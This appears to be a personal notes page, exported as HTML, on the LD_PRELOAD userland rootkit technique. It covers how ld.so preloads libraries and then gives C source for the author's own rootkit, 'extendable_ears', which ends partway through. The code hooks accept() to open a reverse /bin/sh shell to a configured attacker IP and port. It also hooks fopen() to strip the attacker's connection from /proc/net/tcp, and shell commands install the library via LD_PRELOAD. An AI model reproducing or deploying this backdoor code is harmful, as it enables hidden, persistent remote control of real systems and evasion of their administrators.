<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>LD_PRELOAD</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>
<body>
<div class='page'><strong><h1># LD_PRELOAD Userland Rootkit</h1></strong><br />The LD_PRELOAD userland rootkit is a classic technique.<br />Examples:<br />• <a href="https://github.com/chokepoint/Jynx2">https://github.com/chokepoint/Jynx2</a><br />• <a href="https://youtu.be/wyRRbow4-bc?t=401">https://youtu.be/wyRRbow4-bc?t=401</a><br />• <a href="https://h0mbre.github.io/Learn-C-By-Creating-A-Rootkit/#">https://h0mbre.github.io/Learn-C-By-Creating-A-Rootkit/#</a><br /><br />With <code>ldd</code>, we can see the shared libraries that a binary will load.<br /><div class="codebox"><div class="codebox">oswald@ubuntu:~/Downloads$&nbsp;ldd&nbsp;/usr/bin/ping<br />	linux-vdso.so.1&nbsp;(0x00007ffe409ed000)<br />	libcap.so.2&nbsp;=&gt;&nbsp;/lib/x86_64-linux-gnu/libcap.so.2&nbsp;(0x00007f1b929fb000)<br />	libgcrypt.so.20&nbsp;=&gt;&nbsp;/lib/x86_64-linux-gnu/libgcrypt.so.20&nbsp;(0x00007f1b928dd000)<br />	libresolv.so.2&nbsp;=&gt;&nbsp;/lib/x86_64-linux-gnu/libresolv.so.2&nbsp;(0x00007f1b928c1000)<br />	libc.so.6&nbsp;=&gt;&nbsp;/lib/x86_64-linux-gnu/libc.so.6&nbsp;(0x00007f1b926cf000)<br />	libgpg-error.so.0&nbsp;=&gt;&nbsp;/lib/x86_64-linux-gnu/libgpg-error.so.0&nbsp;(0x00007f1b926ac000)<br />	/lib64/ld-linux-x86-64.so.2&nbsp;<span style="color:#000000;font-weight:400">(</span>0x00007f1b92a4c000<span style="color:#000000;font-weight:400">)</span></div></div><br /><br />The libraries listed above are found and loaded by a program called <code>ld.so</code>,<br />and are loaded in order.<br /><a href="https://man7.org/linux/man-pages/man8/ld.so.8.html">https://man7.org/linux/man-pages/man8/ld.so.8.html</a><br /><br /><code>LD_PRELOAD</code> is an environment variable that allows you to define a shared library that will be loaded into every process. It will take precedence over every other library.<br />Here I&#39;ve copied my malicious library to the system and set the <code>LD_PRELOAD</code> environment variable.<br />In the <code>ldd</code> output you can now see our malicious library being loaded before all of the others.<br /><div class="codebox"><div class="codebox">root@ubuntu:/home/oswald#&nbsp;cp&nbsp;extendable-ears.so&nbsp;/lib/x86_64-linux-gnu/<br />root@ubuntu:/home/oswald#&nbsp;export&nbsp;LD_PRELOAD=&quot;/lib/x86_64-linux-gnu/extendable-ears.so&quot;<br />root@ubuntu:/home/oswald#&nbsp;ldd&nbsp;/usr/bin/ping<br />	linux-vdso.so.1&nbsp;(0x00007ffcc99c6000)<br />	/lib/x86_64-linux-gnu/extendable-ears.so&nbsp;(0x00007f0a4d3ec000)<br />	libcap.so.2&nbsp;=&gt;&nbsp;/lib/x86_64-linux-gnu/libcap.so.2&nbsp;(0x00007f0a4d3d2000)<br />	<span style="color:#000000;font-weight:400">[</span>...<span style="color:#000000;font-weight:400">]</span></div></div><br /><br />Because our library is loaded first, this means we can hook functions in the following libraries that are to be loaded, like - <code>printf()</code>, <code>open()</code>, <code>readdir()</code>, etc.- and override their output. This is the principle technique upon how we hide our rootkit.<br /> <br />However, <code>LD_PRELOAD</code> also offers a file in which you can store a list of shared lirbaries to be loaded:<br /><code>/etc/ld.so.preload</code><br />Instead of writing our malicious shared library into the <code>LD_PRELOAD</code> environment variable, we can instead write it into <code>/etc/ld.so.preload</code> and, using code within our rootkit, hide <code>/etc/ld.so.preload</code> from ever being listed on the system.<br /><br /><strong><h2>## extendable_ears</h2></strong><br />This is a Linux userland rootkit I wrote using the <code>LD_PRELOAD</code> technique.<br />A more comprehensive readme can be found on &lt;insert where code is hosted? not sure if it is&gt;<br /><br /><div class="codebox"><div class="codebox">//&nbsp;standard&nbsp;libraries<br />#include&nbsp;&lt;dirent.h&gt;<br />#include&nbsp;&lt;dlfcn.h&gt;<br />#include&nbsp;&lt;stdio.h&gt;<br />#include&nbsp;&lt;string.h&gt;<br />#include&nbsp;&lt;unistd.h&gt;<br /><br />//&nbsp;network&nbsp;libraries<br />#include&nbsp;&lt;sys/types.h&gt;<br />#include&nbsp;&lt;sys/socket.h&gt;<br />#include&nbsp;&lt;arpa/inet.h&gt;<br /><br />//&nbsp;debug<br />//#define&nbsp;DEBUG&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;uncomment&nbsp;for&nbsp;debug&nbsp;statements&nbsp;in&nbsp;/tmp/debug.txt<br />#define&nbsp;DEBUG_FILE&nbsp;&quot;/tmp/debug.txt&quot;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;create&nbsp;this&nbsp;file&nbsp;yourself&nbsp;with&nbsp;666&nbsp;permissions&nbsp;otherwise&nbsp;ERRORS&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;(because&nbsp;function&nbsp;hooks&nbsp;on&nbsp;lower&nbsp;privilege&nbsp;processes&nbsp;won&#39;t&nbsp;have&nbsp;write&nbsp;access&nbsp;to&nbsp;the&nbsp;file)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;touch&nbsp;/tmp/debug.txt&nbsp;-&gt;&nbsp;chmod&nbsp;666&nbsp;/tmp/debug.txt<br /><br />#define&nbsp;ATTACKER_IP&nbsp;&quot;127.0.0.1&quot;<br />#define&nbsp;ATTACKER_IP_HEX_NBO&nbsp;&quot;0100007F&quot;&nbsp;&nbsp;&nbsp;//&nbsp;hex&nbsp;network-byte-order&nbsp;(reversed)&nbsp;version&nbsp;of&nbsp;attacker&nbsp;IP<br />#define&nbsp;ATTACKER_PORT&nbsp;9001<br />#define&nbsp;PRELOAD_FILE&nbsp;&quot;ld.so.preload&quot;<br />#define&nbsp;PRELOAD_FILE_ETC&nbsp;&quot;/etc/ld.so.preload&quot;<br />#define&nbsp;IPV4_INFO_FILE&nbsp;&quot;/proc/net/tcp&quot;<br /><br />//&nbsp;ORIGINAL&nbsp;FUNCTIONS<br />int&nbsp;(*orig_accept)(int&nbsp;sockfd,&nbsp;struct&nbsp;sockaddr&nbsp;*addr,&nbsp;socklen_t&nbsp;*addrlen);<br />FILE&nbsp;*(*orig_fopen)(const&nbsp;char&nbsp;*pathname,&nbsp;const&nbsp;char&nbsp;*mode);<br />FILE&nbsp;*(*orig_fopen64)(const&nbsp;char&nbsp;*pathname,&nbsp;const&nbsp;char&nbsp;*mode);<br />struct&nbsp;dirent&nbsp;*(*orig_readdir)(DIR&nbsp;*dirp);<br />struct&nbsp;dirent64&nbsp;*(*orig_readdir64)(DIR&nbsp;*dirp);<br /><br />//&nbsp;FUNCTIONS&nbsp;TO&nbsp;BE&nbsp;CALLED<br />int&nbsp;ipv4_reverse()<br />{<br />&nbsp;&nbsp;&nbsp;&nbsp;#ifdef&nbsp;DEBUG<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;FILE&nbsp;*debugFile&nbsp;=&nbsp;orig_fopen64(DEBUG_FILE,&nbsp;&quot;a+&quot;);<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fprintf(debugFile,&nbsp;&quot;ipv4_reverse()&nbsp;hit.&nbsp;sending&nbsp;reverse&nbsp;shell...&nbsp;\n&quot;);<br />&nbsp;&nbsp;&nbsp;&nbsp;#endif<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;struct&nbsp;sockaddr_in&nbsp;remoteHost;<br />&nbsp;&nbsp;&nbsp;&nbsp;remoteHost.sin_family&nbsp;=&nbsp;AF_INET;<br />&nbsp;&nbsp;&nbsp;&nbsp;remoteHost.sin_addr.s_addr&nbsp;=&nbsp;inet_addr(ATTACKER_IP);<br />&nbsp;&nbsp;&nbsp;&nbsp;remoteHost.sin_port&nbsp;=&nbsp;htons(ATTACKER_PORT);<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;create&nbsp;socket<br />&nbsp;&nbsp;&nbsp;&nbsp;int&nbsp;tcpSocket_fd&nbsp;=&nbsp;socket(AF_INET,&nbsp;SOCK_STREAM,&nbsp;0);<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;connect&nbsp;to&nbsp;remote&nbsp;listener<br />&nbsp;&nbsp;&nbsp;&nbsp;connect(tcpSocket_fd,&nbsp;(struct&nbsp;sockaddr&nbsp;*)&amp;remoteHost,&nbsp;sizeof(remoteHost));<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;inform&nbsp;remote&nbsp;host<br />&nbsp;&nbsp;&nbsp;&nbsp;char&nbsp;message[]&nbsp;=&nbsp;&quot;[+]&nbsp;spawning&nbsp;shell...&nbsp;\n&quot;;<br />&nbsp;&nbsp;&nbsp;&nbsp;send(tcpSocket_fd,&nbsp;message,&nbsp;sizeof(message),&nbsp;0);<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;fork&nbsp;and&nbsp;spawn&nbsp;/bin/sh<br />&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;if&nbsp;no&nbsp;fork,&nbsp;reverse&nbsp;shell&nbsp;work&nbsp;once&nbsp;and&nbsp;then&nbsp;pause&nbsp;the&nbsp;ssh&nbsp;service&nbsp;(because&nbsp;spawning&nbsp;a&nbsp;shell)<br />&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(fork()&nbsp;==&nbsp;0)<br />&nbsp;&nbsp;&nbsp;&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;create&nbsp;copy&nbsp;of&nbsp;socket&nbsp;file&nbsp;descriptor&nbsp;on&nbsp;stdin&nbsp;0,&nbsp;stdout&nbsp;1,&nbsp;and&nbsp;stderr&nbsp;2&nbsp;with&nbsp;dup2<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;(int&nbsp;i&nbsp;=&nbsp;0;&nbsp;i&nbsp;&lt;&nbsp;2;&nbsp;i++)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;dup2(tcpSocket_fd,&nbsp;i);<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br />&nbsp;&nbsp;&nbsp;&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;spawn&nbsp;shell<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;execve(&quot;/bin/sh&quot;,&nbsp;NULL,&nbsp;NULL);<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;close(tcpSocket_fd);<br />&nbsp;&nbsp;&nbsp;&nbsp;}<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;#ifdef&nbsp;DEBUG<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fclose(debugFile);<br />&nbsp;&nbsp;&nbsp;&nbsp;#endif<br />&nbsp;&nbsp;&nbsp;&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;close(tcpSocket_fd);<br />&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;0;<br />}<br /><br />//&nbsp;HOOKS<br />//&nbsp;accept()&nbsp;HOOKED&nbsp;FUNCTION<br />int&nbsp;accept(int&nbsp;sockfd,&nbsp;struct&nbsp;sockaddr&nbsp;*addr,&nbsp;socklen_t&nbsp;*addrlen)<br />{<br />&nbsp;&nbsp;&nbsp;&nbsp;#ifdef&nbsp;DEBUG<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;FILE&nbsp;*debugFile&nbsp;=&nbsp;orig_fopen64(DEBUG_FILE,&nbsp;&quot;a+&quot;);<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fprintf(debugFile,&nbsp;&quot;accept()&nbsp;intercepted.&nbsp;\n&quot;);<br />&nbsp;&nbsp;&nbsp;&nbsp;#endif<br />&nbsp;&nbsp;&nbsp;&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;int&nbsp;sockFileDesc;&nbsp;&nbsp;&nbsp;//&nbsp;accept()&nbsp;return&nbsp;value&nbsp;-&nbsp;socket&nbsp;file&nbsp;descriptor<br />&nbsp;&nbsp;&nbsp;&nbsp;orig_accept&nbsp;=&nbsp;dlsym(RTLD_NEXT,&nbsp;&quot;accept&quot;);<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;/*<br />&nbsp;&nbsp;&nbsp;&nbsp;strace&nbsp;output&nbsp;of&nbsp;accept():<br />&nbsp;&nbsp;&nbsp;&nbsp;accept(3,&nbsp;{sa_family=AF_INET,&nbsp;sin_port=htons(34310),&nbsp;sin_addr=inet_addr(&quot;127.0.0.1&quot;)},&nbsp;[128-&gt;16])&nbsp;=&nbsp;5<br />&nbsp;&nbsp;&nbsp;&nbsp;GOAL:&nbsp;retrieve&nbsp;connecting&nbsp;IP&nbsp;from&nbsp;sin_addr&nbsp;member&nbsp;in&nbsp;addr&nbsp;struct<br />&nbsp;&nbsp;&nbsp;&nbsp;*/<br />&nbsp;&nbsp;&nbsp;&nbsp;struct&nbsp;sockaddr_in&nbsp;*connectionInfo;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;create&nbsp;sockaddr_in&nbsp;struct<br />&nbsp;&nbsp;&nbsp;&nbsp;connectionInfo&nbsp;=&nbsp;(struct&nbsp;sockaddr_in&nbsp;*)addr;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;type&nbsp;cast&nbsp;addr&nbsp;argument&nbsp;to&nbsp;sockaddr_in&nbsp;struct<br />&nbsp;&nbsp;&nbsp;&nbsp;char&nbsp;*connectingIP&nbsp;=&nbsp;inet_ntoa(connectionInfo-&gt;sin_addr);&nbsp;&nbsp;&nbsp;//&nbsp;retrieve&nbsp;connecting&nbsp;IP&nbsp;from&nbsp;sockaddr_in&nbsp;struct<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;if&nbsp;connecting&nbsp;IP&nbsp;in&nbsp;accept()&nbsp;call&nbsp;is&nbsp;the&nbsp;attacker&#39;s&nbsp;IP<br />&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;FIRST&nbsp;CHECK&nbsp;OF&nbsp;THIS&nbsp;ALWAYS&nbsp;FAILS.&nbsp;don&#39;t&nbsp;know&nbsp;why&nbsp;¯\_(ツ)_/¯<br />&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(strcmp(connectingIP,&nbsp;ATTACKER_IP)&nbsp;==&nbsp;0)<br />&nbsp;&nbsp;&nbsp;&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#ifdef&nbsp;DEBUG<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fprintf(debugFile,&nbsp;&quot;IPs&nbsp;match!&nbsp;-&nbsp;moving&nbsp;to&nbsp;send&nbsp;reverse&nbsp;shell&nbsp;\n&quot;);<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#endif<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;send&nbsp;reverse&nbsp;shell<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ipv4_reverse();<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;complete&nbsp;accept()&nbsp;call<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sockFileDesc&nbsp;=&nbsp;orig_accept(sockfd,&nbsp;addr,&nbsp;addrlen);<br />&nbsp;&nbsp;&nbsp;&nbsp;}<br />&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;if&nbsp;connecting&nbsp;IP&nbsp;IS&nbsp;NOT&nbsp;the&nbsp;attacker&#39;s&nbsp;IP<br />&nbsp;&nbsp;&nbsp;&nbsp;else<br />&nbsp;&nbsp;&nbsp;&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#ifdef&nbsp;DEBUG<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fprintf(debugFile,&nbsp;&quot;IPs&nbsp;don&#39;t&nbsp;match&nbsp;:/&nbsp;-&nbsp;running&nbsp;original&nbsp;accept()&nbsp;function&nbsp;\n&quot;);<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#endif<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;run&nbsp;original&nbsp;accept()&nbsp;function<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sockFileDesc&nbsp;=&nbsp;orig_accept(sockfd,&nbsp;addr,&nbsp;addrlen);<br />&nbsp;&nbsp;&nbsp;&nbsp;}<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;#ifdef&nbsp;DEBUG<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fclose(debugFile);<br />&nbsp;&nbsp;&nbsp;&nbsp;#endif<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;sockFileDesc;<br />}<br /><br />//&nbsp;fopen()&nbsp;HOOKED&nbsp;FUNCTION<br />FILE&nbsp;*fopen(const&nbsp;char&nbsp;*pathname,&nbsp;const&nbsp;char&nbsp;*mode)&nbsp;<br />{&nbsp;&nbsp;&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;FILE&nbsp;*filePointer;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;fopen()&nbsp;return&nbsp;value<br />&nbsp;&nbsp;&nbsp;&nbsp;orig_fopen&nbsp;=&nbsp;dlsym(RTLD_NEXT,&nbsp;&quot;fopen&quot;);&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;point&nbsp;to&nbsp;next&nbsp;runtime&nbsp;instance&nbsp;of&nbsp;fopen()<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;#ifdef&nbsp;DEBUG<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;FILE&nbsp;*debugFile&nbsp;=&nbsp;orig_fopen(DEBUG_FILE,&nbsp;&quot;a+&quot;);<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fprintf(debugFile,&nbsp;&quot;fopen()&nbsp;intercepted.&nbsp;\n&quot;);<br />&nbsp;&nbsp;&nbsp;&nbsp;#endif<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;if&nbsp;fopen()&nbsp;is&nbsp;reading&nbsp;&quot;/proc/net/tcp&quot;<br />&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(strcmp(pathname,&nbsp;IPV4_INFO_FILE)&nbsp;==&nbsp;0)&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#ifdef&nbsp;DEBUG<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fprintf(debugFile,&nbsp;&quot;fopen(\&quot;/proc/net/tcp\&quot;)&nbsp;intercepted.&nbsp;\n&quot;);<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#endif<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;FILE&nbsp;*tmp&nbsp;=&nbsp;tmpfile();&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;open&nbsp;tmp&nbsp;file&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;FILE&nbsp;*targetFile&nbsp;=&nbsp;orig_fopen(pathname,&nbsp;mode);&nbsp;&nbsp;&nbsp;//&nbsp;open&nbsp;&quot;/proc/net/tcp&quot;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;char&nbsp;line[256];&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;var&nbsp;to&nbsp;store&nbsp;read&nbsp;lines<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;read&nbsp;target&nbsp;file&nbsp;line&nbsp;by&nbsp;line&nbsp;until&nbsp;empty<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;while&nbsp;(fgets(line,&nbsp;sizeof(line),&nbsp;targetFile)&nbsp;!=&nbsp;NULL)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;if&nbsp;line&nbsp;DOES&nbsp;NOT&nbsp;contain&nbsp;ATTACKER_IP<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(strstr(line,&nbsp;ATTACKER_IP_HEX_NBO)&nbsp;==&nbsp;NULL)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#ifdef&nbsp;DEBUG<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fprintf(debugFile,&nbsp;&quot;writing&nbsp;line&nbsp;to&nbsp;tmpfile()&nbsp;\n&quot;);<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#endif&nbsp;&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;write&nbsp;line&nbsp;to&nbsp;tmpfile<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fputs(line,&nbsp;tmp);<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;if&nbsp;line&nbsp;DOES&nbsp;contin&nbsp;ATTACKER_IP<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#ifdef&nbsp;DEBUG<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fprintf(debugFile,&nbsp;&quot;ATTACKER_IP&nbsp;found!&nbsp;not&nbsp;writing&nbsp;line&nbsp;to&nbsp;tmpfile()&nbsp;\n&quot;);<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#endif&nbsp;&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;do&nbsp;nothing&nbsp;(i.e.&nbsp;don&#39;t&nbsp;write&nbsp;line)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;rewind(tmp);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;rewind()&nbsp;file&nbsp;pointer&nbsp;to&nbsp;beginning&nbsp;of&nbsp;stream<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;filePointer&nbsp;=&nbsp;tmp;&nbsp;&nbsp;//&nbsp;set&nbsp;filePointer&nbsp;so&nbsp;that&nbsp;tmpfile()&nbsp;containing&nbsp;tampered&nbsp;/proc/net/tcp&nbsp;will&nbsp;be&nbsp;returned<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;}<br />&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;if&nbsp;fopen()&nbsp;isn&#39;t&nbsp;reading&nbsp;&quot;/proc/net/tcp&quot;<br />&nbsp;&nbsp;&nbsp;&nbsp;else<br />&nbsp;&nbsp;&nbsp;&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;open&nbsp;the&nbsp;file<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;filePointer&nbsp;=&nbsp;orig_fopen(pathname,&nbsp;mode);<br />&nbsp;&nbsp;&nbsp;&nbsp;}<br /><br 